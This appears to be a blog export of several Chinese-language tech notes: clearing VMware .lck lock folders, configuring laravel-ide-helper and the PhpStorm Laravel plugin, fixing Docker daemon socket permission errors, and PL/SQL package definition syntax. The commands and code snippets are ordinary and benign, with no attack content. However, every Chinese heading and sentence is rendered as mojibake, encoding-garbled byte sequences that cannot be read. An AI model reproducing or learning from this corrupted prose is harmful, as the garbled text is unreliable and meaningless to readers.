<h2 id="å…³äºå¼ºåˆ¶å…³é—­vmware"><a href="#å…³äºå¼ºåˆ¶å…³é—­vmware" class="headerlink" title="å…³äºå¼ºåˆ¶å…³é—­vmware"></a>å…³äºå¼ºåˆ¶å…³é—­vmware</h2><p>ç”±äºå¡ä½æˆ–å…¶ä»–å¼‚å¸¸åŸå› å¼ºåˆ¶å…³é—­vmwareï¼Œå†æ¬¡å¼€å¯ä¼šæ˜¾ç¤ºè¢«é”ä½æ— æ³•æ‰“å¼€</p>
<p><strong>åŸå› ï¼š</strong>å› ä¸ºä¸€ä¸ªè™šæ‹Ÿæœºæ‰“å¼€ï¼Œé¿å…é‡å¤å¼€å¯åŒä¸€è™šæ‹Ÿæœºï¼Œä¼šåˆ›å»ºå‡ ä¸ªlckæ–‡ä»¶å¤¹å°†è¿™ä¸ªè™šæ‹Ÿæœºé”ä½ï¼Œè€Œå¼ºåˆ¶é€€å‡ºä¼šå¯¼è‡´è™šæ‹Ÿæœºæ¥ä¸åŠåˆ é™¤è¿™å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œä¸‹æ¬¡å†æ‰“å¼€ï¼Œå¯¼è‡´è¯»å–åˆ°lckæ–‡ä»¶å¤¹ï¼Œè¢«é”ä½æ— æ³•æ‰“å¼€ã€‚</p>
<h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>åˆ é™¤vmessæ–‡ä»¶å’Œæ‰€æœ‰lckæ–‡ä»¶å¤¹</p>
<p><strong>ç»“æœï¼š</strong>ä¼šä¸¢å¤±ä¿å­˜çš„è™šæ‹ŸæœºçŠ¶æ€ï¼Œè™šæ‹Ÿæœºé‡æ–°å¼€æœº</p>
<h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><ul>
<li>å¦‚æœå‡ºç°ç¨‹åºå ç”¨æ— æ³•åˆ é™¤çš„æƒ…å†µï¼Œå¯ä»¥æ‰¾åˆ°å ç”¨ç¨‹åºå…³é—­åå†åˆ é™¤</li>
<li>è¿™æ ·ä¼šå¯¼è‡´å†æ¬¡æ‰“å¼€è™šæ‹Ÿæœºå‡ºç°æ­£åœ¨ç­‰å¾…è¿æ¥ï¼Œå› ä¸ºå ç”¨ç¨‹åºè¢«å…³é—­äº†</li>
<li>é‡å¯æˆ–è€…æ‰¾åˆ°å ç”¨ç¨‹åºå†æ¬¡å¼€å¯å°±å¥½äº†</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>é…ç½®phpstormæ”¯æŒlaravelä»£ç æç¤º</title>
    <url>/2020/01/12/Note/%E9%85%8D%E7%BD%AEphpstorm%E6%94%AF%E6%8C%81laravel%E4%BB%A3%E7%A0%81%E6%8F%90%E7%A4%BA/</url>
    <content><![CDATA[<h1 id="é…ç½®phpstormæ”¯æŒlaravelä»£ç æç¤º"><a href="#é…ç½®phpstormæ”¯æŒlaravelä»£ç æç¤º" class="headerlink" title="é…ç½®phpstormæ”¯æŒlaravelä»£ç æç¤º"></a>é…ç½®phpstormæ”¯æŒlaravelä»£ç æç¤º</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å®‰è£…å’Œä½¿ç”¨laravel-ide-helperå’Œphpstormä¸­çš„laravelæ’ä»¶</p>
<a id="more"></a>
<h2 id="laravelæ’ä»¶"><a href="#laravelæ’ä»¶" class="headerlink" title="laravelæ’ä»¶"></a>laravelæ’ä»¶</h2><ol>
<li>åœ¨file-&gt;settings-&gt;pluginsä¸­æœç´¢laravelå¹¶å®‰è£…</li>
<li>åœ¨file-&gt;settings-&gt;languages &amp; Frameworks-&gt;php-&gt;laravelä¸­å¯ç”¨,å‹¾é€‰enabledé€‰æ‹©æ¡†</li>
<li>ä¸¤ç§æƒ…å†µé…ç½®viewsç­‰æç¤º<ul>
<li>è‹¥laravelä¸ºphpstormæ‰“å¼€çš„é¡¹ç›®ç›®å½•,åˆ™é»˜è®¤é…ç½®å³å¯ç”¨</li>
<li>è‹¥laravelä¸ºphpstormæ‰“å¼€çš„é¡¹ç›®ç›®å½•çš„å­ç›®å½•,åˆ™éœ€è¦é…ç½®<ul>
<li>file-&gt;settings-&gt;languages &amp; Frameworks-&gt;php-&gt;laravel-&gt;views/templates</li>
<li>ä»¿ç…§é»˜è®¤çš„é…ç½®,ä»æ ¹ç›®å½•å¼€å§‹ä¹¦å†™è·¯å¾„<ul>
<li>ä¾‹å¦‚D:\phpstudy_pro\WWW\blog\app\views</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="laravel-ide-helper"><a href="#laravel-ide-helper" class="headerlink" title="laravel-ide-helper"></a>laravel-ide-helper</h2><p>éœ€è¦å€ŸåŠ©composer</p>
<h3 id="composer-å®‰è£…-laravel-ide-helper"><a href="#composer-å®‰è£…-laravel-ide-helper" class="headerlink" title="composer å®‰è£… laravel-ide-helper"></a>composer å®‰è£… laravel-ide-helper</h3><ul>
<li><code>composer require --dev barryvdh/laravel-ide-helper</code></li>
</ul>
<h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>åœ¨ <code>ã€Œconfig/app.phpã€</code>çš„ <code>ã€Œprovidersã€</code>æ•°ç»„ä¸­åŠ å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider::class</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Laravel ç‰ˆæœ¬å°äº 5.5 çš„è¯ï¼Œéœ€è¦æ³¨å†Œæä¾›è€…ï¼Œ5.5ä¹‹åçš„ç‰ˆæœ¬laravelåŠ å…¥äº†è‡ªåŠ¨æ³¨å†Œ</p>
</blockquote>
<p>**æ³¨:**å¦‚æœåªåœ¨å¼€å‘ç¯å¢ƒä¸­å®‰è£…ã€Œlarave-ide-helperã€ï¼Œå¯ä»¥åœ¨<code>ã€Œapp/Providers/AppServiceProvider.phpã€</code>çš„<code>ã€Œregisterã€</code>æ–¹æ³•ä¸­å†™å…¥ä¸‹é¢ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function register()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;app-&gt;environment() !&#x3D;&#x3D; &#39;production&#39;) &#123;</span><br><span class="line">        $this-&gt;app-&gt;register(\Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider::class);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¯¼å‡ºé…ç½®æ–‡ä»¶"><a href="#å¯¼å‡ºé…ç½®æ–‡ä»¶" class="headerlink" title="å¯¼å‡ºé…ç½®æ–‡ä»¶"></a>å¯¼å‡ºé…ç½®æ–‡ä»¶</h3><p>ï¼ˆå¦‚æœé»˜è®¤é…ç½®å°±æ»¡è¶³éœ€æ±‚äº†ï¼Œä¹Ÿå¯ä»¥å¿½ç•¥è¿™ä¸€æ­¥ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan vendor:publish --provider&#x3D;&quot;Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider&quot; --tag&#x3D;config</span><br></pre></td></tr></table></figure>
<h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan ide-helper:generate - ä¸º Facades ç”Ÿæˆæ³¨é‡Š</span><br><span class="line">php artisan ide-helper:models - ä¸ºæ•°æ®æ¨¡å‹ç”Ÿæˆæ³¨é‡Š</span><br><span class="line">php artisan ide-helper:meta - ç”Ÿæˆ PhpStorm Meta file</span><br></pre></td></tr></table></figure>
<h4 id="è‡ªåŠ¨ä¸ºFacades-ç”Ÿæˆæ³¨é‡Š"><a href="#è‡ªåŠ¨ä¸ºFacades-ç”Ÿæˆæ³¨é‡Š" class="headerlink" title="è‡ªåŠ¨ä¸ºFacades ç”Ÿæˆæ³¨é‡Š"></a>è‡ªåŠ¨ä¸ºFacades ç”Ÿæˆæ³¨é‡Š</h4><p>ç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan ide-helper:generate</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨:</strong> å¦‚æœå­˜åœ¨æ–‡ä»¶ ã€Œbootstrap/compiled.phpã€ éœ€è¦å…ˆåˆ é™¤ï¼Œ å¯ä»¥åœ¨ç”Ÿæˆæ–‡å½“å‰è¿è¡Œ php artisan clear-compiledã€‚</p>
<h4 id="è‡ªåŠ¨ä¸ºæ¨¡å‹ç”Ÿæˆæ³¨é‡Š"><a href="#è‡ªåŠ¨ä¸ºæ¨¡å‹ç”Ÿæˆæ³¨é‡Š" class="headerlink" title="è‡ªåŠ¨ä¸ºæ¨¡å‹ç”Ÿæˆæ³¨é‡Š"></a>è‡ªåŠ¨ä¸ºæ¨¡å‹ç”Ÿæˆæ³¨é‡Š</h4><p>ä¸ºæ‰€æœ‰æ¨¡å‹ç”Ÿæˆæ³¨é‡Š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan ide-helper:models</span><br><span class="line">#è¿™æ—¶ä¼šå‡ºç°è¯¢é—®ï¼š</span><br><span class="line">Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes&#x2F;No):  (yes&#x2F;no) [no]:</span><br></pre></td></tr></table></figure>
<p>**æ³¨:**è¾“å…¥ yes åˆ™ä¼šç›´æ¥åœ¨æ¨¡å‹æ–‡ä»¶ä¸­å†™å…¥æ³¨é‡Šï¼Œå¦åˆ™ä¼šç”Ÿæˆã€Œ_ide_helper_models.phpã€æ–‡ä»¶ã€‚å»ºè®®é€‰æ‹© yesï¼Œè¿™æ ·åœ¨è·Ÿè¸ªæ–‡ä»¶çš„æ—¶å€™ä¸ä¼šè·³è½¬åˆ°ã€Œ_ide_helper_models.phpã€æ–‡ä»¶ï¼Œä¸è¿‡è¿™ä¹ˆåšæœ€å¥½å¯¹æ¨¡å‹æ–‡ä»¶åšä¸ªå¤‡ä»½ï¼Œè‡³å°‘åœ¨ç”Ÿæˆæ³¨é‡Šä¹‹å‰ç”¨ git æ§åˆ¶ä¸€ä¸‹ç‰ˆæœ¬ï¼Œä»¥é˜²ä¸‡ä¸€ã€‚</p>
<blockquote>
<p><strong>æç¤ºï¼š</strong> ä¸ºæ¨¡å‹ç”Ÿæˆå­—æ®µä¿¡æ¯å¿…é¡»åœ¨æ•°æ®åº“ä¸­å­˜åœ¨ç›¸åº”çš„æ•°æ®è¡¨ï¼Œä¸è¦ç”Ÿæˆ migration è¿˜æ²¡è¿è¡Œ migrate çš„æ—¶å€™å°±ç”Ÿæˆæ³¨é‡Šï¼Œè¿™æ ·æ˜¯å¾—ä¸åˆ°å­—æ®µä¿¡æ¯çš„ã€‚</p>
</blockquote>
<h4 id="è‡ªåŠ¨ä¸ºé“¾å¼æ“ä½œæ³¨é‡Š"><a href="#è‡ªåŠ¨ä¸ºé“¾å¼æ“ä½œæ³¨é‡Š" class="headerlink" title="è‡ªåŠ¨ä¸ºé“¾å¼æ“ä½œæ³¨é‡Š"></a>è‡ªåŠ¨ä¸ºé“¾å¼æ“ä½œæ³¨é‡Š</h4><p>è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼Œåœ¨ migration æ–‡ä»¶ä¸­ç»å¸¸å¯ä»¥çœ‹è§è¿™æ ·çš„ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$table-&gt;string(&#39;email&#39;)-&gt;unique();</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶å°±ç®—è°ƒç”¨è¿‡äº† <code>php artisan ide-helper:generate</code>ï¼Œåœ¨è°ƒç”¨åƒ <code>-&gt;unique()</code> è¿™æ ·çš„é“¾å¼æ“ä½œçš„æ—¶å€™ä¹Ÿæ— æ³•å®ç°ä»£ç æç¤º.</p>
<p>éœ€è¦å°†é…ç½®æ–‡ä»¶(<code>ide-help.php</code>,å¯ä»¥ä½¿ç”¨phpstormçš„Find-&gt;Find in path æŸ¥æ‰¾ include_fluent)<code>&#39;include_fluent&#39; =&gt; false</code> ä¿®æ”¹ä¸º <code>&#39;include_fluent&#39; =&gt; true</code>ï¼Œ</p>
<p>é‡æ–°è¿è¡Œ <code>php artisan ide-helper:generate</code>ã€‚</p>
<h4 id="ç”Ÿæˆ-phpStorm-meta-php"><a href="#ç”Ÿæˆ-phpStorm-meta-php" class="headerlink" title="ç”Ÿæˆ .phpStorm.meta.php"></a>ç”Ÿæˆ .phpStorm.meta.php</h4><p>å¯ä»¥ç”Ÿæˆä¸€ä¸ª<code>.phpStorm.meta.php</code>æ–‡ä»¶å»æ”¯æŒå·¥å‚æ¨¡å¼.</p>
<p>å¯¹äº Laravel, è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è®© PhpStorm ç†è§£æˆ‘ä»¬ä» IoC å®¹å™¨ä¸­è§£å†³äº†ä»€ä¹ˆç±»å‹çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼šäº‹ä»¶å°†è¿”å›ä¸€ä¸ª<code>ã€ŒIlluminate\Events\Dispatcherã€</code>å¯¹è±¡ï¼Œåˆ©ç”¨ meta æ–‡ä»¶æ‚¨å¯ä»¥è°ƒç”¨ <code>app(&#39;events&#39;)</code> å¹¶ä¸”å®ƒå°†è‡ªåŠ¨å®Œæˆ Dispatcher çš„æ–¹æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app(&#39;events&#39;)-&gt;fire();</span><br><span class="line">\App::make(&#39;events&#39;)-&gt;fire();</span><br><span class="line"></span><br><span class="line">&#x2F;** @var \Illuminate\Foundation\Application $app *&#x2F;</span><br><span class="line">$app-&gt;make(&#39;events&#39;)-&gt;fire();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; When the key is not found, it uses the argument as class name</span><br><span class="line">app(&#39;App\SomeClass&#39;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>**æç¤º:**å¯èƒ½éœ€è¦é‡å¯ Phpstorm ä½¿ .phpStorm.meta.php æ–‡ä»¶ç”Ÿæ•ˆã€‚</p>
</blockquote>
<h4 id="è‡ªåŠ¨è¿è¡Œ-generate"><a href="#è‡ªåŠ¨è¿è¡Œ-generate" class="headerlink" title="è‡ªåŠ¨è¿è¡Œ generate"></a>è‡ªåŠ¨è¿è¡Œ generate</h4><p>æƒ³åœ¨ä¾èµ–åŒ…æ›´æ–°æ˜¯è‡ªåŠ¨æ›´æ–°æ³¨é‡Šï¼Œå¯ä»¥åœ¨ composer.json æ–‡ä»¶ä¸­åšå¦‚ä¸‹é…ç½®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;scripts&quot;:&#123;</span><br><span class="line">    &quot;post-update-cmd&quot;: [</span><br><span class="line">        &quot;Illuminate\\Foundation\\ComposerScripts::postUpdate&quot;,</span><br><span class="line">        &quot;php artisan ide-helper:generate&quot;,</span><br><span class="line">        &quot;php artisan ide-helper:meta&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ä»£ç æç¤º"><a href="#ä»£ç æç¤º" class="headerlink" title="ä»£ç æç¤º"></a>ä»£ç æç¤º</h4><p>å½“æƒ³æç¤ºviewsæ–‡ä»¶,modelsæ–‡ä»¶æ—¶å¯ä»¥ä½¿ç”¨é»˜è®¤å¿«æ·é”®<code>ctrl+space</code></p>
<p>**æ³¨:**ä½†å¯èƒ½ä¼šè¢«åˆ‡æ¢è¾“å…¥æ³•ç­‰å ç”¨,æ‰€ä»¥å¯ä»¥æ›´æ”¹è¾“å…¥æ³•å¿«æ·é”®æˆ–è€…phpstormä¸­çš„å¿«æ·é”®</p>
<h5 id="ä¿®æ”¹phpstormä¸­çš„å¿«æ·é”®æ–¹æ³•"><a href="#ä¿®æ”¹phpstormä¸­çš„å¿«æ·é”®æ–¹æ³•" class="headerlink" title="ä¿®æ”¹phpstormä¸­çš„å¿«æ·é”®æ–¹æ³•"></a>ä¿®æ”¹phpstormä¸­çš„å¿«æ·é”®æ–¹æ³•</h5><p>åœ¨file-&gt;settings-&gt;keymapä¸­æœç´¢completion,ä¿®æ”¹å†²çªå¿«æ·é”®</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>php</tag>
        <tag>laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerå‘½ä»¤ä½¿ç”¨æƒé™é—®é¢˜</title>
    <url>/2020/01/07/Note/docker%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="dockerå‘½ä»¤ä½¿ç”¨æƒé™é—®é¢˜"><a href="#dockerå‘½ä»¤ä½¿ç”¨æƒé™é—®é¢˜" class="headerlink" title="dockerå‘½ä»¤ä½¿ç”¨æƒé™é—®é¢˜"></a>dockerå‘½ä»¤ä½¿ç”¨æƒé™é—®é¢˜</h1><h2 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: Got permission denied while trying to connect to the Docker daemon socket......</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³:"></a>è§£å†³:</h2><p>æƒé™é—®é¢˜,å½“å‰ç”¨æˆ·æ²¡æœ‰è¿è¡Œdockerçš„æƒé™</p>
<h3 id="å»ºè®®è§£å†³åŠæ³•"><a href="#å»ºè®®è§£å†³åŠæ³•" class="headerlink" title="å»ºè®®è§£å†³åŠæ³•"></a>å»ºè®®è§£å†³åŠæ³•</h3><p>å°†å½“å‰ç”¨æˆ·åŠ å…¥dockerç”¨æˆ·ç»„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test@ubuntu~$whoami </span><br><span class="line">test</span><br><span class="line">test@ubuntu~$sudo groupadd docker</span><br><span class="line">test@ubuntu~$sudo usermod test -aG docker </span><br><span class="line">#ç‰©ç†æœºéœ€è¦æ³¨é”€ç™»å½•,é‡æ–°ç™»å½•</span><br><span class="line">#ç»ˆç«¯è¿æ¥éœ€é€€å‡ºç™»å½•,é‡æ–°ç™»å½•</span><br><span class="line">#é‡æ–°ç™»å½•åè¿è¡Œä¸‹é¢å‘½ä»¤</span><br><span class="line">test@ubuntu~$groups</span><br><span class="line">test ....... docker</span><br><span class="line">#å‡ºç°docker,å†è¿è¡Œdockerå‘½ä»¤,ä¸ä¼šå†å¯¹æƒé™æŠ¥é”™</span><br></pre></td></tr></table></figure>
<h3 id="ä¸æ¨èè§£å†³åŠæ³•"><a href="#ä¸æ¨èè§£å†³åŠæ³•" class="headerlink" title="ä¸æ¨èè§£å†³åŠæ³•"></a>ä¸æ¨èè§£å†³åŠæ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å°†&#x2F;var&#x2F;run&#x2F;docker.socketæ–‡ä»¶æƒé™å¢åŠ </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>plsqlåŒ…</title>
    <url>/2019/12/17/Oracle/plsql%E5%8C%85/</url>
    <content><![CDATA[<h1 id="plsqlåŒ…"><a href="#plsqlåŒ…" class="headerlink" title="plsqlåŒ…"></a>plsqlåŒ…</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><ul>
<li>åŒ…æ˜¯ä¸€ç»„ç›¸å…³è¿‡ç¨‹ã€å‡½æ•°ã€å˜é‡ã€å¸¸é‡å’Œæ¸¸æ ‡ç­‰PL/SQLç¨‹åºè®¾è®¡å…ƒç´ çš„ç»„åˆï¼Œå®ƒå…·æœ‰é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡è¯­è¨€çš„ç‰¹ç‚¹ï¼Œæ˜¯å¯¹è¿™äº›PL/SQL ç¨‹åºè®¾è®¡å…ƒç´ çš„å°è£…ã€‚</li>
<li>åŒ…ç±»ä¼¼äºC++å’ŒJAVAè¯­è¨€ä¸­çš„ç±»<ul>
<li>å…¶ä¸­å˜é‡ç›¸å½“äºç±»ä¸­çš„æˆå‘˜å˜é‡ï¼Œè¿‡ç¨‹å’Œå‡½æ•°ç›¸å½“äºç±»æ–¹æ³•ã€‚</li>
<li>æŠŠç›¸å…³çš„æ¨¡å—å½’ç±»æˆä¸ºåŒ…ï¼Œå¯ä½¿å¼€å‘äººå‘˜åˆ©ç”¨é¢å‘å¯¹è±¡çš„æ–¹æ³•è¿›è¡Œå­˜å‚¨è¿‡ç¨‹çš„å¼€å‘ï¼Œä»è€Œæé«˜ç³»ç»Ÿæ€§èƒ½ã€‚</li>
</ul>
</li>
<li>ä¸ç±»ç›¸åŒï¼ŒåŒ…ä¸­çš„ç¨‹åºå…ƒç´ ä¹Ÿåˆ†ä¸ºå…¬ç”¨å…ƒç´ å’Œç§ç”¨å…ƒç´ ä¸¤ç§ï¼Œè¿™ä¸¤ç§å…ƒç´ çš„åŒºåˆ«æ˜¯ä»–ä»¬å…è®¸è®¿é—®çš„ç¨‹åºèŒƒå›´ä¸åŒï¼Œå³å®ƒä»¬çš„ä½œç”¨åŸŸä¸åŒã€‚<ul>
<li>å…¬ç”¨å…ƒç´ ä¸ä»…å¯ä»¥è¢«åŒ…ä¸­çš„å‡½æ•°ã€è¿‡ç¨‹æ‰€è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è¢«åŒ…å¤–çš„PL/SQLç¨‹åºè®¿é—®ï¼Œ</li>
<li>ç§æœ‰å…ƒç´ åªèƒ½è¢«åŒ…å†…çš„å‡½æ•°å’Œè¿‡ç¨‹åºæ‰€è®¿é—®ã€‚</li>
</ul>
</li>
<li>åœ¨PL/SQLç¨‹åºè®¾è®¡ä¸­ï¼Œä½¿ç”¨åŒ…ä¸ä»…å¯ä»¥ä½¿ç¨‹åºè®¾è®¡æ¨¡å—åŒ–ï¼Œå¯¹å¤–éšè—åŒ…å†…æ‰€ä½¿ç”¨çš„ä¿¡æ¯ï¼ˆé€šè¿‡ä½¿ç”¨ç§ç”¨å˜é‡ï¼‰ï¼Œè€Œä¸”å¯ä»¥æé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚<ul>
<li>å› ä¸ºï¼Œå½“ç¨‹åºé¦–æ¬¡è°ƒç”¨åŒ…å†…å‡½æ•°æˆ–è¿‡ç¨‹æ—¶ï¼ŒORACLEå°†æ•´ä¸ªåŒ…è°ƒå…¥å†…å­˜ï¼Œå½“å†æ¬¡è®¿é—®åŒ…å†…å…ƒç´ æ—¶ï¼ŒORACLEç›´æ¥ä»å†…å­˜ä¸­è¯»å–ï¼Œè€Œä¸éœ€è¦è¿›è¡Œç£ç›˜I/Oæ“ä½œï¼Œä»è€Œä½¿ç¨‹åºæ‰§è¡Œæ•ˆç‡å¾—åˆ°æé«˜<a id="more"></a>
<h2 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h2></li>
</ul>
</li>
</ul>
<p>ä¸€ä¸ªåŒ…ç”±ä¸¤ä¸ªåˆ†å¼€çš„éƒ¨åˆ†ç»„æˆ</p>
<ul>
<li><p>åŒ…å®šä¹‰</p>
<p>ï¼ˆPACKAGEï¼‰</p>
<ul>
<li>åŒ…å®šä¹‰éƒ¨åˆ†å£°æ˜åŒ…å†…æ•°æ®ç±»å‹ã€å˜é‡ã€å¸¸é‡ã€æ¸¸æ ‡ã€å­ç¨‹åºå’Œå¼‚å¸¸é”™è¯¯å¤„ç†ç­‰å…ƒç´ ã€‚</li>
<li>è¿™äº›å…ƒç´ ä¸ºåŒ…çš„<strong>å…¬æœ‰å…ƒç´ </strong>ã€‚</li>
</ul>
</li>
<li><p>åŒ…ä¸»ä½“</p>
<p>ï¼ˆPACKAGE BODYï¼‰</p>
<ul>
<li>åŒ…ä¸»ä½“åˆ™æ˜¯åŒ…å®šä¹‰éƒ¨åˆ†çš„å…·ä½“å®ç°ï¼Œå®ƒå®šä¹‰äº†åŒ…å®šä¹‰éƒ¨åˆ†æ‰€å£°æ˜çš„æ¸¸æ ‡å’Œå­ç¨‹åºã€‚</li>
<li>åŒ…ä¸»ä½“ä¸­å¯ä»¥å£°æ˜åŒ…çš„<strong>ç§æœ‰å…ƒç´ </strong>ã€‚</li>
</ul>
</li>
</ul>
<p><strong>æ³¨ï¼š</strong></p>
<p>åŒ…å®šä¹‰å’ŒåŒ…ä¸»ä½“åˆ†å¼€ç¼–è¯‘ï¼Œå¹¶ä½œä¸ºä¸¤éƒ¨åˆ†åˆ†å¼€çš„å¯¹è±¡å­˜æ”¾åœ¨æ•°æ®åº“å­—å…¸ä¸­ã€‚</p>
<h2 id="åŒ…å®šä¹‰"><a href="#åŒ…å®šä¹‰" class="headerlink" title="åŒ…å®šä¹‰"></a>åŒ…å®šä¹‰</h2><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] PACKAGE package_name </span><br><span class="line">&#123;IS | AS&#125; </span><br><span class="line">  [å…¬æœ‰æ•°æ®ç±»å‹å®šä¹‰[å…¬æœ‰æ•°æ®ç±»å‹å®šä¹‰]â€¦] </span><br><span class="line">  [å…¬æœ‰æ¸¸æ ‡å£°æ˜[å…¬æœ‰æ¸¸æ ‡å£°æ˜]â€¦] </span><br><span class="line">  [å…¬æœ‰å˜é‡ã€å¸¸é‡å£°æ˜[å…¬æœ‰å˜é‡ã€å¸¸é‡å£°æ˜]â€¦] </span><br><span class="line">  [å…¬æœ‰å­ç¨‹åºå£°æ˜[å…¬æœ‰å­ç¨‹åºå£°æ˜]â€¦] </span><br><span class="line">END [package_name];</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>åœ¨Oracleçš„å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°ä¸­ï¼Œå…¶å®ISå’ŒASæ˜¯åŒä¹‰è¯ã€‚</li>
<li>è¿˜æœ‰åœ¨è‡ªå®šä¹‰ç±»å‹ï¼ˆTPYEï¼‰å’ŒåŒ…ï¼ˆPACKAGEï¼‰æ—¶ï¼Œä½¿ç”¨ISå’ŒASä¹Ÿå¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚</li>
<li>ä½†æ˜¯åœ¨åˆ›å»ºè§†å›¾ï¼ˆVIEWï¼‰æ—¶ï¼Œåªèƒ½ä½¿ç”¨ASè€Œä¸èƒ½ä½¿ç”¨ISã€‚</li>
<li>åœ¨å£°æ˜æ¸¸æ ‡ï¼ˆCURSORï¼‰æ—¶ï¼Œåªèƒ½ä½¿ç”¨ISè€Œä¸èƒ½ä½¿ç”¨ASã€‚</li>
</ul>
<h2 id="åŒ…ä¸»ä½“"><a href="#åŒ…ä¸»ä½“" class="headerlink" title="åŒ…ä¸»ä½“"></a>åŒ…ä¸»ä½“</h2><h3 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] PACKAGE BODY package_name </span><br><span class="line">&#123;IS | AS&#125; </span><br><span class="line">  [ç§æœ‰æ•°æ®ç±»å‹å®šä¹‰[ç§æœ‰æ•°æ®ç±»å‹å®šä¹‰]â€¦] </span><br><span class="line">  [ç§æœ‰å˜é‡ã€å¸¸é‡å£°æ˜[ç§æœ‰å˜é‡ã€å¸¸é‡å£°æ˜]â€¦] </span><br><span class="line">  [ç§æœ‰å­ç¨‹åºå£°æ˜å’Œå®šä¹‰[ç§æœ‰å­ç¨‹åºå£°æ˜å’Œå®šä¹‰]â€¦] </span><br><span class="line">  [å…¬æœ‰æ¸¸æ ‡å®šä¹‰[å…¬æœ‰æ¸¸æ ‡å®šä¹‰]â€¦] </span><br><span class="line">  [å…¬æœ‰å­ç¨‹åºå®šä¹‰[å…¬æœ‰å­ç¨‹åºå®šä¹‰]â€¦] </span><br><span class="line">[BEGIN </span><br><span class="line">  PL&#x2F;SQL è¯­å¥] </span><br><span class="line">END [package_name];</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<p>åœ¨åŒ…ä¸»ä½“å®šä¹‰å…¬æœ‰ç¨‹åºæ—¶ï¼Œå®ƒä»¬å¿…é¡»ä¸åŒ…å®šä¹‰ä¸­æ‰€å£°æ˜å­ç¨‹åºçš„æ ¼å¼å®Œå…¨ä¸€è‡´</p>
